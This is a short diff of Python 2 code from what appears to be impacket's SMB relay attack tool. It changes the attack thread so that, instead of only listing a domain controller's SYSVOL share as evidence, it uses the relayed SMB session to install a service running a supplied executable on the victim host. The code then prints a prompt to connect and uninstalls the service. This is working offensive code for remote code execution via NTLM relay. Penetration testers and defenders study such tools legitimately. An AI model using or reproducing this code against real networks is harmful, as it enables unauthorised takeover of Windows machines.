@@ -69,17 +69,14 @@ except Exception:
 class doAttack(Thread):
     def __init__(self, SMBClient, exeFile):
         Thread.__init__(self)
-        self.SMBClient = SMBClient
+        self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
 
     def run(self):
         # Here PUT YOUR CODE!
-        from impacket.smbconnection import SMBConnection
-        smbConnection = SMBConnection(existingConnection=self.SMBClient)
-        files =  smbConnection.listPath('SYSVOL','\\*')
-        print "EVIDENCE: SYSVOL's contents!"
-        for file in files:
-            print file.get_longname()
-        smbConnection.logoff()
+        result = self.installService.install()
+        if result is True:
+            print "[*] Service Installed.. CONNECT!"
+            self.installService.uninstall()
 
 class SMBClient(smb.SMB):
     def __init__(self, remote_name, extended_security = True, sess_port = 445):
